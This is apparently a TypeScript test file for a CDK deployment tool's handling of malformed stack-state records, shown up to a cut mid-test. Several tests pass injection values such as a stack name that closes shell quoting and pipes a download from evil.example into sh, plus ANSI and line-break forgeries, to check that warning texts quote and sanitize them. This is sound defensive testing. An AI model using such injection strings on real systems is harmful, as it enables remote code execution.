import { describe, expect, it } from 'vite-plus/test';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import {
  STATE_RESOURCES_MALFORMED,
  hasReadableOutputs,
  hasReadableResources,
  isReadableBag,
  malformedExportSourceWarning,
  malformedOutputsRefusalMessage,
  malformedOutputsWarning,
  malformedRenderedContainersWarning,
  malformedResourcesWarning,
  malformedStateRefusalMessage,
  refuseMalformedOutputs,
  refuseMalformedState,
  repairMalformedOutputsForReadOnly,
  repairMalformedResourcesForReadOnly,
  type RenderedStateContainer,
} from '../../../src/state/malformed-resources-bag.js';
import { UNRENDERABLE } from '../../../src/utils/display-safe.js';
import { CdkdError } from '../../../src/utils/error-handler.js';
import type { StackState } from '../../../src/types/state.js';

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

/**
 * Source with comments removed. Every source-shape assertion below reads THIS,
 * because one of them was already satisfied by prose: a
 * `toContain('!opts.dryRun')` matched a doc comment quoting the gate it meant
 * to pin, so deleting the runtime gate and keeping the comment left the fence
 * green. A grep over un-stripped source asserts that someone WROTE a string,
 * not that the code DOES anything.
 */
function code(relPath: string): string {
  return readFileSync(join(repoRoot, relPath), 'utf8')
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(^|[^:])\/\/.*$/gm, '$1');
}

function state(resources: unknown): StackState {
  return {
    version: 10,
    stackName: 'S',
    region: 'us-east-1',
    resources: resources as StackState['resources'],
    outputs: {},
    lastModified: 0,
  };
}

/** Every shape a hand-edited record can carry that is not a readable bag. */
const UNREADABLE: ReadonlyArray<readonly [string, unknown]> = [
  ['null', null],
  ['absent', undefined],
  ['an array', []],
  ['a number', 5],
  ['a string', 'ab'],
];

describe('repairMalformedResourcesForReadOnly', () => {
  for (const [label, value] of UNREADABLE) {
    it(`repairs ${label} and reports that it did`, () => {
      const s = state(value);
      expect(repairMalformedResourcesForReadOnly(s)).toBe(true);
      expect(s.resources).toEqual({});
    });
  }

  it('leaves a populated bag byte-identical and reports no repair', () => {
    const bag = { A: { physicalId: 'p', resourceType: 'T', properties: {} } };
    const s = state(bag);
    expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
    // The SAME object, not a copy: callers hold the backend's reference and an
    // etag-paired saveState must write back the record that was read.
    expect(s.resources).toBe(bag);
  });

  it('leaves an EMPTY bag alone — {} is a legitimate deployed-nothing record', () => {
    const bag = {};
    const s = state(bag);
    expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
    expect(s.resources).toBe(bag);
  });
});

describe('repairMalformedOutputsForReadOnly (issue go-to-k/cdkd#3189)', () => {
  /**
   * The bag under test is `outputs`, so the record's `resources` bag is healthy
   * in every case here — the two are independent containers and a record can be
   * malformed in either alone.
   */
  /**
   * A POPULATED resources bag, not `{}`. The sibling-untouched assertion below
   * compares against this value, and `{}` is also what a wrongful wipe
   * produces — so with an empty bag that assertion could not fail (review of
   * go-to-k/cdkd#3194).
   */
  const HEALTHY_RESOURCES = {
    R: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: { Name: 'b' } },
  };

  function withOutputs(outputs: unknown): StackState {
    const s = state(structuredClone(HEALTHY_RESOURCES));
    s.outputs = outputs as StackState['outputs'];
    return s;
  }

  /**
   * The shared table MINUS `absent`, which this half exempts. See the case
   * below and the function's own note: an absent bag never reaches either
   * stored-bag lookup (both gate on `!== undefined`), so it is inert, and a
   * record with no `outputs` is one `cdkd scrub` round-trips deliberately.
   * `null` stays in — it passes that gate and throws.
   */
  const UNREADABLE_OUTPUTS = UNREADABLE.filter(([label]) => label !== 'absent');

  it('excludes exactly ONE shape from the shared table, and names it', () => {
    // Derived, not re-spelled: a shape added to `UNREADABLE` lands in the loop
    // below automatically, and this case reds if the exemption ever widens
    // silently to cover it too.
    expect(UNREADABLE.length - UNREADABLE_OUTPUTS.length).toBe(1);
    expect(UNREADABLE_OUTPUTS.map(([label]) => label)).not.toContain('absent');
  });

  for (const [label, value] of UNREADABLE_OUTPUTS) {
    it(`repairs ${label} and reports that it did`, () => {
      const s = withOutputs(value);
      expect(repairMalformedOutputsForReadOnly(s)).toBe(true);
      expect(s.outputs).toEqual({});
      // The SIBLING container is untouched — the repair is per-bag, so a record
      // whose outputs are damaged keeps whatever its resource map held. Compared
      // against a POPULATED bag: `{}` here would be satisfied by a wrongful wipe
      // too, which is the shape this assertion shipped in first.
      expect(s.resources).toEqual(HEALTHY_RESOURCES);
    });
  }

  it('leaves an ABSENT bag alone — a record with no outputs is one cdkd supports', () => {
    // The divergence from the `resources` half, and from `isReadableBag`'s own
    // verdict. `cdkd scrub` refuses to materialize `{}` over such a record
    // (`src/cli/commands/scrub.ts`), and the deploy's failure-path saves write
    // `outputs: currentState.outputs`, which `JSON.stringify` DROPS when
    // undefined — so warning here would fire on healthy state. Both stored-bag
    // lookups in `resolveTemplateOutputs` gate on `!== undefined`, so nothing
    // on the diff path dereferences it.
    const s = withOutputs(undefined);
    expect(repairMalformedOutputsForReadOnly(s)).toBe(false);
    // ...and NOT materialized: the repair must not give the record a bag it
    // did not have, even in memory, or a later reader cannot tell the two
    // apart.
    expect(s.outputs).toBeUndefined();
  });

  it('repairs a BOOLEAN too — the shape the shared table does not carry', () => {
    // `UNREADABLE` is `refuseMalformedState`'s table and stops at `'ab'`; a
    // boolean is the fifth shape a hand-edited record reaches this path with,
    // and `Object.entries(true)` is `[]`, so it fabricates nothing and could
    // look exempt. It is repaired anyway: `hasOwnProperty.call(true, k)` is the
    // lookup the resolver makes one call earlier, and a record holding `true`
    // where a map belongs is malformed whatever the walk does with it.
    const s = withOutputs(true);
    expect(repairMalformedOutputsForReadOnly(s)).toBe(true);
    expect(s.outputs).toEqual({});
  });

  it('leaves a populated bag byte-identical and reports no repair', () => {
    const bag = { Endpoint: 'https://x', 'Stack:Export': ['a', 'b'] };
    const s = withOutputs(bag);
    expect(repairMalformedOutputsForReadOnly(s)).toBe(false);
    // The SAME object: a diff compares against the values the record holds, and
    // a copy here would silently drop a `__proto__` key the record can carry.
    expect(s.outputs).toBe(bag);
  });

  it('leaves an EMPTY bag alone — {} is a legitimate exports-nothing record', () => {
    const bag = {};
    const s = withOutputs(bag);
    expect(repairMalformedOutputsForReadOnly(s)).toBe(false);
    expect(s.outputs).toBe(bag);
  });

  it('agrees with the resources half on every shape BUT absent, which is the only divergence', () => {
    // Not a tautology through one shared helper: this compares the two EXPORTED
    // entry points over every shape, which is what reds if either one grows its
    // own inline test (the drift `isReadableBag` exists to prevent) — and the
    // `absent` row is asserted as a DISAGREEMENT rather than skipped, so the
    // exemption cannot spread to the resources half unnoticed.
    for (const [label, value] of UNREADABLE) {
      const outputsVerdict = repairMalformedOutputsForReadOnly(withOutputs(value));
      const resourcesVerdict = repairMalformedResourcesForReadOnly(state(value));
      if (label === 'absent') {
        expect(resourcesVerdict, 'an absent resources bag is still a defect').toBe(true);
        expect(outputsVerdict, 'an absent outputs bag is not').toBe(false);
        continue;
      }
      expect(outputsVerdict, label).toBe(resourcesVerdict);
    }
  });
});

/**
 * The WRITE-capable half of the `outputs` container (issue go-to-k/cdkd#3192)
 * — the opposite answer from `repairMalformedOutputsForReadOnly` above, for
 * the same shapes, and the asymmetry IS the fix: repairing a bag and then
 * saving it is the laundering this refusal exists to stop.
 */
describe('refuseMalformedOutputs + hasReadableOutputs (issue go-to-k/cdkd#3192)', () => {
  const HEALTHY_RESOURCES = {
    R: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: { Name: 'b' } },
  };

  function withOutputs(outputs: unknown): StackState {
    const s = state(structuredClone(HEALTHY_RESOURCES));
    s.outputs = outputs as StackState['outputs'];
    return s;
  }

  /** The shared table MINUS `absent`, which this half exempts — see below. */
  const UNREADABLE_OUTPUTS = UNREADABLE.filter(([label]) => label !== 'absent');

  for (const [label, value] of UNREADABLE_OUTPUTS) {
    it(`REFUSES ${label} with the shared code`, () => {
      let thrown: unknown;
      try {
        refuseMalformedOutputs(withOutputs(value), 'MyStack', 'eu-west-1');
      } catch (err) {
        thrown = err;
      }
      expect(thrown, `a ${label} outputs bag was not refused`).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
      expect((thrown as CdkdError).message).toBe(
        malformedOutputsRefusalMessage('MyStack', 'eu-west-1')
      );
    });
  }

  it('FLOOR: a populated, an empty and an ABSENT bag all pass through', () => {
    // The other side of the fence, without which "refuses what it must" says
    // nothing: a guard that threw on everything would satisfy every case
    // above. The absent row is the one that would break real records — a
    // deploy's failure-path save writes `outputs: currentState.outputs`, which
    // `JSON.stringify` DROPS when undefined, and `cdkd scrub` round-trips such
    // a record deliberately.
    expect(() => refuseMalformedOutputs(withOutputs({ A: 'a' }), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedOutputs(withOutputs({}), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedOutputs(withOutputs(undefined), 'S', 'r')).not.toThrow();
  });

  it('refuses on the `outputs` bag ALONE, with the resource map intact', () => {
    // The two containers are independent, so the outputs refusal must not need
    // a damaged resource map to fire — and `refuseMalformedState` must not fire
    // on this record either, or the user would be told not to run
    // `cdkd deploy` for a reason that does not hold. Both directions pinned,
    // because collapsing the two calls into one is the obvious "simplification".
    const s = withOutputs('abcdef');
    expect(() => refuseMalformedState(s, 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedOutputs(s, 'S', 'r')).toThrow();

    const other = state(null);
    other.outputs = { A: 'a' };
    expect(() => refuseMalformedOutputs(other, 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedState(other, 'S', 'r')).toThrow();
  });

  it('never MUTATES the record it refuses — the evidence is what it protects', () => {
    // A refusal that repaired on its way out would lose exactly what it is
    // there to preserve, and the caller holds the same object.
    const s = withOutputs('abcdef');
    expect(() => refuseMalformedOutputs(s, 'S', 'r')).toThrow();
    expect(s.outputs).toBe('abcdef' as unknown as StackState['outputs']);
  });

  it('agrees with the read-only half on every shape, opposite verdicts aside', () => {
    // One predicate under both, so the write-capable and read-only answers
    // cannot come to differ about whether a given record is damaged — only
    // about what to DO. `hasReadableOutputs` is the shared test; this walks the
    // two exported entry points over it.
    for (const [label, value] of UNREADABLE) {
      const readable = hasReadableOutputs(withOutputs(value));
      const repaired = repairMalformedOutputsForReadOnly(withOutputs(value));
      let refused = false;
      try {
        refuseMalformedOutputs(withOutputs(value), 'S', 'r');
      } catch {
        refused = true;
      }
      expect(repaired, label).toBe(!readable);
      expect(refused, label).toBe(!readable);
    }
  });
});

describe('the malformed-outputs REFUSAL text (issue go-to-k/cdkd#3192)', () => {
  it('names the container, the write, and the shared-index blast radius', () => {
    const m = malformedOutputsRefusalMessage('S', 'us-east-1');
    expect(m).toContain(`'outputs'`);
    expect(m).toContain('can WRITE state');
    // The sentence that makes this text different from the `resources`
    // refusal, which is about re-CREATING a stack. Here the resource map is
    // intact and what is at stake is the region-wide exports index.
    expect(m).toContain('exports index');
    // ...and it must NOT borrow the resources text's remedy advice, which
    // would attach a do-not-deploy warning to a stack whose resources are fine.
    expect(m).not.toContain('re-CREATE');
    expect(m).not.toContain(`'resources'`);
  });

  it('shell-quotes a hostile stack name and emits the command LAST', () => {
    const evil = "a'; curl http://x|sh; echo '";
    const m = malformedOutputsRefusalMessage(evil, 'us-east-1');
    // The command this text tells a user to PASTE must not be closable by the
    // name interpolated into it.
    expect(m).not.toContain(`${evil} --stack-region`);
    expect(m).toContain('cdkd state show');
    expect(m.split('\n')).toHaveLength(1);
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder', () => {
    const controlOnly = String.fromCharCode(0x00, 0x01);
    expect(malformedOutputsRefusalMessage(controlOnly, 'us-east-1')).toContain(UNRENDERABLE);
  });

  it('CAPS a multi-kilobyte name so the remedy command stays on screen', () => {
    // The cap is inherited from the shared `safeIdentifier`, and inheritance is
    // exactly what stops being true when someone inlines a helper — so each
    // new message gets its own case (review of go-to-k/cdkd#3206). A stack name
    // can arrive from an S3 key, so this is reachable rather than theoretical.
    // Asserted as a DISTANCE, not `endsWith`: the template satisfies an
    // endsWith check with or without a cap.
    const long = malformedOutputsRefusalMessage('q'.repeat(5000), 'us-east-1');
    expect(long).toContain(`${'q'.repeat(128)}...`);
    expect(long).toContain('cdkd state show');
    expect(long.length).toBeLessThan(1500);
  });
});

describe('the malformed export-SOURCE warning (issue go-to-k/cdkd#3192)', () => {
  it('says the rebuild CONTINUES and names the symptom a reader will meet', () => {
    const w = malformedExportSourceWarning('Producer', 'us-east-1');
    expect(w).toContain('Producer');
    expect(w).toContain(`'exportNames'`);
    // The distinguishing sentence: the failure shows up in a DIFFERENT stack,
    // naming the consumer, so this line is the only place the damaged producer
    // is named at all.
    expect(w).toContain('CONSUMER');
    expect(w).toContain('Continuing');
    // And it must not read as a refusal — the index serves every producer in
    // the region and aborting over one record would take them all down.
    expect(w).not.toContain('refuses');
  });

  it('is a DIFFERENT text from its two outputs siblings', () => {
    // Three texts for one container is deliberate; a future edit that
    // collapses any pair loses the consequence each states.
    const source = malformedExportSourceWarning('S', 'us-east-1');
    expect(source).not.toBe(malformedOutputsWarning('S', 'us-east-1'));
    expect(source).not.toBe(malformedOutputsRefusalMessage('S', 'us-east-1'));
    expect(malformedOutputsWarning('S', 'us-east-1')).not.toBe(
      malformedOutputsRefusalMessage('S', 'us-east-1')
    );
  });

  it('shell-quotes a hostile identifier and stays on one line', () => {
    const evil = "a'; curl http://x|sh; echo '";
    const w = malformedExportSourceWarning(evil, 'us-east-1');
    expect(w).not.toContain(`${evil} --stack-region`);
    expect(w.split('\n')).toHaveLength(1);
    expect(malformedExportSourceWarning(String.fromCharCode(0x00), 'r')).toContain(UNRENDERABLE);
  });

  it('CAPS a multi-kilobyte producer name too', () => {
    // Same reason as the refusal's own cap case, and this one matters more:
    // the producer name here comes off an S3 KEY during a rebuild, with no
    // user in the loop to have typed it.
    const long = malformedExportSourceWarning('q'.repeat(5000), 'us-east-1');
    expect(long).toContain(`${'q'.repeat(128)}...`);
    expect(long).toContain('cdkd state show');
    expect(long.length).toBeLessThan(1500);
  });
});

describe('the malformed-outputs warning (issue go-to-k/cdkd#3189)', () => {
  it('names the container and the consequence a DIFF has, not a renderer\x27s', () => {
    const w = malformedOutputsWarning('S', 'us-east-1');
    expect(w).toContain(`'outputs'`);
    // The sentence that makes this text different from its two siblings. A
    // reader who sees ADD rows for outputs the stack already has must be told
    // the comparison lost its left-hand side; `malformedRenderedContainersWarning`
    // says the view "shows no rows there", which is false of a diff.
    expect(w).toContain('is reported as an ADD');
    expect(w).not.toContain('this view shows no rows');
    // ...and NOT the resources text's deploy/destroy prohibition: the resource
    // SET is readable here, so borrowing it would attach a
    // re-create-the-world warning to a record whose resources are intact.
    expect(w).not.toContain(`Do NOT run 'cdkd deploy'`);
    // The fabrication clause is CONDITIONAL, not an assertion about this
    // record. Five shapes reach this text and only two of them invent rows —
    // `null`, `42` and `true` yield none — so an unconditional "INVENTS a
    // REMOVE row per character" would diagnose a harm that did not occur for
    // three of them (review of go-to-k/cdkd#3194).
    expect(w).toContain('Where the stored value is a string or a list');
    expect(w).toContain('yields no comparison at all');
  });

  it('renders both identifiers exactly as its sibling messages do, and ends on the command', () => {
    // A planted stack name that would close the quoting and append its own
    // command to the line this text tells the user to RUN — a stack name
    // reaches this path from an S3 key, so it is not trusted.
    const evil = "a'; curl http://x|sh; echo '";
    const w = malformedOutputsWarning(evil, 'us-east-1');
    const start = w.indexOf('cdkd state show ');
    expect(start).toBeGreaterThan(-1);
    const command = w.slice(start);
    expect(command.endsWith('--json')).toBe(true);
    // BYTE-IDENTICAL to the command BOTH siblings build from the same inputs —
    // pinning the shared sanitize-then-shell-quote path rather than re-spelling
    // `shellQuote`'s output here. This module now hand-spells that command in
    // THREE places, so pinning against only one of the two siblings would let
    // the unpinned pair drift apart (review of go-to-k/cdkd#3194).
    expect(malformedResourcesWarning(evil, 'us-east-1')).toContain(command);
    expect(malformedRenderedContainersWarning(evil, 'us-east-1', ['outputs'])).toContain(command);
    expect(command).not.toContain(`show ${evil} `);
  });

  it('keeps a control-bearing identifier on ONE line, so it cannot forge a row', () => {
    const w = malformedOutputsWarning(
      `Evil${String.fromCharCode(0x1b)}[31m\nStack: Decoy`,
      'us-east-1'
    );
    expect(w.split('\n')).toHaveLength(1);
    expect(w).not.toContain(String.fromCharCode(0x1b));
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder, not nothing', () => {
    // An empty argument makes `--stack-region` swallow the next flag, turning
    // the remedy into a differently-broken command. Built from escapes rather
    // than literal bytes, so `grep` does not read this file as binary.
    const w = malformedOutputsWarning('S', String.fromCharCode(0x00, 0x01));
    expect(w).toContain(UNRENDERABLE);
  });
});

describe('refuseMalformedState', () => {
  for (const [label, value] of UNREADABLE) {
    it(`refuses ${label} with a named code rather than a bare TypeError`, () => {
      let thrown: unknown;
      try {
        refuseMalformedState(state(value), 'MyStack', 'eu-west-1');
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
      expect((thrown as CdkdError).message).toContain('MyStack');
      // The refusal has to say WHY a write-capable command will not proceed,
      // or it reads as the same unhelpful abort go-to-k/cdkd#3018 reported.
      expect((thrown as CdkdError).message).toContain('WRITE');
    });
  }

  it('passes a readable bag through, empty included', () => {
    expect(() => refuseMalformedState(state({}), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedState(state({ A: {} }), 'S', 'r')).not.toThrow();
  });
});

describe('the user-facing text', () => {
  it('names the record and forbids the two commands that would act on it', () => {
    const warning = malformedResourcesWarning('MyStack', 'eu-west-1');
    expect(warning).toContain('MyStack');
    expect(warning).toContain('eu-west-1');
    // An empty resource set is indistinguishable from a healthy empty stack in
    // every later line of output, so the warning has to say which it is.
    expect(warning).toContain('EMPTY');
    expect(warning).toContain('cdkd deploy');
    expect(warning).toContain('cdkd destroy');
  });

  it('sanitizes both interpolations — they land inside a pasteable command', () => {
    // A stack name reaches the cross-stack read path from an Fn::GetStackOutput
    // argument or an S3 key, and ConsoleLogger sanitizes a logger's extra ARGS,
    // never the message string. Unsanitized, a name could forge a line break
    // and append its own instruction to the command the text says to run, or
    // hide the real one behind an ANSI sequence.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r'];
    const hostile = `Evil${FORGERIES.join('')}Stack`;
    // Non-vacuity: the probe input must actually carry every forgery, or the
    // assertions below pass over a string that never had them.
    for (const forge of FORGERIES) {
      expect(hostile.includes(forge), `probe input lost ${JSON.stringify(forge)}`).toBe(true);
    }

    const texts = [malformedResourcesWarning(hostile, hostile)];
    try {
      refuseMalformedState(state(null), hostile, hostile);
    } catch (err) {
      texts.push((err as Error).message);
    }
    expect(texts.length, 'refuseMalformedState did not throw for a null bag').toBe(2);

    for (const text of texts) {
      for (const forge of FORGERIES) {
        expect(
          text.includes(forge),
          `rendered text still carries ${JSON.stringify(forge)}: ${JSON.stringify(text)}`
        ).toBe(false);
      }
      // And the sanitizer must not have eaten the identifier entirely — the
      // message has to still name WHICH record is broken.
      expect(text).toContain('Evil');
      expect(text).toContain('Stack');
    }
  });

  it('shell-quotes the remedy, so a hostile name cannot append its own command', () => {
    // displaySafe(asciiOnly) is a printable-ASCII allowlist: it removes the
    // control-character class above but KEEPS ' ; | ` $ and spaces. The
    // previous cut wrapped the command in '...' with only that sanitizing, so
    // this name closed the quoting and appended a command to the line the text
    // tells the user to RUN.
    const INJECTION = "a'; curl http://evil.example/x|sh; echo '";
    // BOTH arguments, and both orders. The region side is interpolated into
    // the same command and was unfenced: passing a benign `us-east-1` there
    // made `shellQuote(reg)` deletable with no test noticing, since shellQuote
    // returns an ordinary region unquoted anyway.
    const texts: string[] = [
      malformedResourcesWarning(INJECTION, 'us-east-1'),
      malformedResourcesWarning('MyStack', INJECTION),
    ];
    for (const [stack, region] of [
      [INJECTION, 'us-east-1'],
      ['MyStack', INJECTION],
    ] as const) {
      try {
        refuseMalformedState(state(null), stack, region);
      } catch (err) {
        texts.push((err as Error).message);
      }
    }
    expect(texts.length).toBe(4);

    for (const text of texts) {
      // The PROSE carries both identifiers too and was outside every probe,
      // so check the whole text, not only the command tail.
      expect(text, 'the hostile value never reached the rendered text').toContain('curl');
      const command = text.slice(text.indexOf('cdkd state show'));
      expect(command, 'the remedy command is missing').toContain('cdkd state show');
      // Inside a single-quoted shell word, the ONLY way out is a closing quote.
      // shellQuote escapes each one as '\'' so the word never terminates early.
      expect(
        command.includes("|sh") && !command.includes("'\\''"),
        `the remedy still carries an unescaped injection: ${command}`
      ).toBe(false);
    }
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder, not nothing', () => {
    // An empty argument makes --stack-region swallow --json, turning a remedy
    // into a differently-broken command.
    const text = malformedResourcesWarning('\u0000\u0001', '\u0002');
    expect(text).toContain('<unrenderable>');
    // NOT `not.toContain('--stack-region --json')`: neither regression can emit
    // that exact string -- dropping UNRENDERABLE gives `--stack-region '' --json`
    // and dropping shellQuote gives TWO spaces -- so it could never fail.
    // Assert the positive: a NAMED argument follows the flag.
    expect(text).toMatch(/--stack-region \S+ --json/);
  });

  it('carries the generic exit code — scrub needs a different one and says so', () => {
    // `refuseMalformedState` is a plain CdkdError (exit 1, the generic error).
    // That is right for import / orphan / rollback, and WRONG for scrub, whose
    // exit 1 means "--fail found plaintext" — so scrub raises its own exit-2
    // class around `malformedStateRefusalMessage` instead. A single shared
    // code would be wrong in the other direction too: `cdkd rollback`
    // documents 2 as "PARTIAL — journal kept, idempotent re-run", which would
    // tell an operator to re-run a command that attempted nothing.
    let thrown: CdkdError | undefined;
    try {
      refuseMalformedState(state(null), 'S', 'r');
    } catch (err) {
      thrown = err as CdkdError;
    }
    expect(thrown).toBeDefined();
    expect(
      (thrown as unknown as { exitCode?: number }).exitCode,
      'refuseMalformedState now pins an exitCode; check it against EACH refusing command’s ' +
        'documented contract before adopting it — they disagree.'
    ).toBeUndefined();

    // scrub raises its own class, so its wording CAN drift from this one.
    // `expect(thrown.message).toContain(malformedStateRefusalMessage(...))`
    // would be self-referential -- refuseMalformedState IS that throw -- so
    // the claim is checked where it can actually be false: scrub's source.
    expect(
      code('src/cli/commands/scrub.ts'),
      'scrub no longer raises its refusal through malformedStateRefusalMessage, so its wording ' +
        'can drift from every other refusing command.'
    ).toContain('malformedStateRefusalMessage(');
  });

  it('hasReadableResources is exported, because scrub branches on it directly', () => {
    expect(hasReadableResources(state(null))).toBe(false);
    expect(hasReadableResources(state({}))).toBe(true);
  });

  it('every scrubStack return AFTER the repair carries the finding', () => {
    // The first cut of this signal patched the SAME early-return arm twice and
    // missed the main success path, so a stack whose bag was repaired AND
    // whose outputs held a secret returned without the flag and the finding
    // was lost.
    //
    // Counted on a REQUIRED field rather than by brace-matching the returns: a
    // `[\s\S]*?` span ran past an arm's closing brace and swallowed the next
    // one, which made this fence red for the wrong reason while looking right.
    // `unverifiableReads` appears exactly once per ScrubStackResult literal.
    const src = code('src/cli/commands/scrub.ts');
    const repairAt = src.indexOf('repairMalformedResourcesForReadOnly(state)');
    expect(repairAt, 'scrub no longer repairs under --dry-run').toBeGreaterThan(-1);
    // A CODE anchor, and specifically the CALL in scrubStack's masking-boundary
    // catch. Two earlier spellings were wrong in opposite directions: the
    // comment `THE MASKING BOUNDARY` resolves to -1 now that `src` is
    // comment-stripped (span = rest of file), and `} catch (err) {` matches an
    // INNER catch 901 characters in (span = empty, zero literals, fence
    // vacuous). `maskSecretsInError` is called only in that outer catch and
    // sits after both result literals.
    const endAt = src.indexOf('maskSecretsInError', repairAt);
    expect(endAt, "scrubStack's masking boundary moved; this fence's end anchor is gone").
      toBeGreaterThan(repairAt);

    const body = src.slice(repairAt, endAt);

    // PER LITERAL, not a union total. B1 was a DISTRIBUTION defect — one arm
    // carried the spread twice and the other zero — so `2 spreads across 2
    // literals` was true of the BUG and of the fix alike, and a summed fence
    // passes on the source it exists to reject (measured against both blobs).
    // Splitting on the required field and counting inside each literal is what
    // makes `[2, 0]` distinguishable from `[1, 1]`.
    const perLiteral = body
      .split('unverifiableReads:')
      .slice(1)
      .map((rest) => {
        const close = rest.indexOf('};');
        const literal = close >= 0 ? rest.slice(0, close) : rest;
        return literal.split('malformedResources ? { malformedResources }').length - 1;
      });

    expect(
      perLiteral.length,
      'found fewer than two ScrubStackResult literals after the repair; this fence is ' +
        'asserting nothing'
    ).toBeGreaterThanOrEqual(2);
    expect(
      perLiteral,
      `each ScrubStackResult returned after the repair must carry \`malformedResources\` ` +
        `exactly once; got ${JSON.stringify(perLiteral)}. A zero means a stack whose resources ` +
        `bag was repaired can return through that arm with the finding LOST — ` +
        `\`--dry-run --fail\` then reports a clean run over a record it never read ` +
        `(go-to-k/cdkd#3018). A two means a duplicate spread, which is how the missing one was ` +
        `masked the first time.`
    ).toEqual(perLiteral.map(() => 1));
  });

  it('the malformed-record finding is raised INSIDE the --dry-run branch', () => {
    // The finding is set ONLY under `--dry-run`, and `scrubCommand`'s dry-run
    // branch RETURNS -- so a throw placed after that branch is dead code for
    // it. The first cut did exactly that: `--dry-run --fail` then exited 1 via
    // `ScrubNeededError`, the code reserved for "scrub looked and found a leak
    // -- rotate the secret", which is the opposite remedy; and because that
    // error is `silent: true`, the finding's message never printed either.
    //
    // A source-shape check is what fits here: the defect is the POSITION of a
    // throw relative to a `return`, and `scrubCommand` is behind synthesis.
    const src = code('src/cli/commands/scrub.ts');
    const branchAt = src.indexOf('if (options.dryRun) {');
    expect(branchAt, "scrubCommand's --dry-run branch is gone or renamed").toBeGreaterThan(-1);
    const returnAt = src.indexOf('\n    return;', branchAt);
    expect(returnAt, "the --dry-run branch's own return is gone").toBeGreaterThan(branchAt);

    const branch = src.slice(branchAt, returnAt);
    expect(
      branch,
      'the malformed-record finding is not raised inside the --dry-run branch. It can only be ' +
        'SET under --dry-run, and that branch returns, so a throw below it never runs: the run ' +
        'exits 0, or 1 via the SILENT ScrubNeededError, whose code means the opposite remedy ' +
        '(go-to-k/cdkd#3018).'
    ).toContain('malformedRecords.length > 0');

    // And ABOVE the --fail gate, or ScrubNeededError wins the race and
    // swallows the message.
    expect(
      branch.indexOf('malformedRecords.length > 0'),
      'the finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) fires ' +
        'first and reports "scrub found a leak" for a record scrub could not read.'
    ).toBeLessThan(branch.indexOf('if (options.fail)'));

    // The `outputs` half gets BOTH assertions too (review of
    // go-to-k/cdkd#3206). Its first cut asserted only that the identifier
    // appeared SOMEWHERE IN THE FILE, and the reviewer measured the cost:
    // splitting the throw so the outputs arm sat BELOW `if (options.fail)`
    // left 107 of 107 cases green while re-introducing #3018's round-1 defect
    // for the new container — `--dry-run --fail` over an unreadable outputs
    // bag exiting 1 through the SILENT ScrubNeededError, with the
    // audited-record message never printed.
    expect(
      branch,
      'the malformed-OUTPUTS finding is not raised inside the --dry-run branch, so it never ' +
        'runs: that branch returns.'
    ).toContain('malformedOutputRecords.length > 0');
    expect(
      branch.indexOf('malformedOutputRecords.length > 0'),
      'the outputs finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) ' +
        'fires first and reports "scrub found a leak" for outputs scrub could not read.'
    ).toBeLessThan(branch.indexOf('if (options.fail)'));
  });
});

describe('isReadableBag is the ONE predicate (issue go-to-k/cdkd#3187)', () => {
  /**
   * Every shape, with the verdict written as a LITERAL rather than taken from
   * the sibling predicate.
   *
   * `hasReadableResources` delegates, so comparing the two is true by
   * construction and reds on nothing inside `isReadableBag` (measured: mutating
   * it to `return true` reds 14 cases in this file, none of them the comparison
   * — review of go-to-k/cdkd#3190). The literals are the coverage; the
   * comparison below is drift-detection for the day someone RE-INLINES the body
   * into `hasReadableResources`, which is the only way the two can disagree.
   */
  const READABLE: ReadonlyArray<readonly [string, unknown, boolean]> = [
    // DERIVED from the shared table, not re-spelled beside it: a shape added
    // there must be covered here too, and a hand-written copy silently would
    // not be (review of go-to-k/cdkd#3190). The verdicts stay literals — that
    // is the half that must not be computed.
    ...UNREADABLE.map(([label, value]) => [label, value, false] as const),
    ['a boolean', true, false],
    ['an empty object', {}, true],
    ['a populated object', { A: 1 }, true],
  ];

  it('answers the plain-object question for every shape', () => {
    for (const [label, value, expected] of READABLE) {
      expect(isReadableBag(value), label).toBe(expected);
    }
  });

  it('and hasReadableResources still delegates to it, so the two cannot drift', () => {
    for (const [label, value] of READABLE) {
      expect(hasReadableResources(state(value)), label).toBe(isReadableBag(value));
    }
  });
});

describe('the rendered-container warning (issue go-to-k/cdkd#3187)', () => {
  const CONTAINERS: readonly RenderedStateContainer[] = [
    'outputs',
    'skippedOutputs',
    'attributes',
    'properties',
  ];

  it('renders both identifiers exactly as its sibling messages do, and ends on the command', () => {
    // A planted stack name that would close the quoting and append its own
    // command to the line this text tells the user to RUN. A stack name reaches
    // these paths from an S3 key, so it is not trusted.
    const evil = "a'; curl http://x|sh; echo '";
    const w = malformedRenderedContainersWarning(evil, 'us-east-1', ['outputs']);
    const sibling = malformedResourcesWarning(evil, 'us-east-1');

    // The command is LAST and UNWRAPPED here — an outer `'...'` would compose
    // with `shellQuote`'s own quoting into something unpastable.
    //
    // `command.endsWith('--json')` is the whole LAST assertion. An
    // `expect(w.endsWith(command))` beside it would be a tautology, since
    // `command` is a suffix of `w` by construction, and it read as a second
    // check (review of go-to-k/cdkd#3190). This one reds on any prose appended
    // after the command.
    const start = w.indexOf('cdkd state show ');
    expect(start).toBeGreaterThan(-1);
    const command = w.slice(start);
    expect(command.endsWith('--json')).toBe(true);

    // ...and BYTE-IDENTICAL to the command the sibling message builds from the
